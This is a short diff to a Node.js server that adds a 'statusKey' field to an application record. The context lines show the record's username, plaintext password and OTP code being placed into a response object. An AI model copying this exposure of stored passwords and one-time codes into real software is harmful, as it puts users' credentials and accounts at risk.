@@ -296,6 +296,7 @@ const server = http.createServer((req, res) => {
           phone: application.phone || '—',
           email: application.email || '—',
           status: status,
+          statusKey: application.status || 'pending',
           username: application.username || '',
           password: application.password || '',
           otpCode: application.otpCode || '',
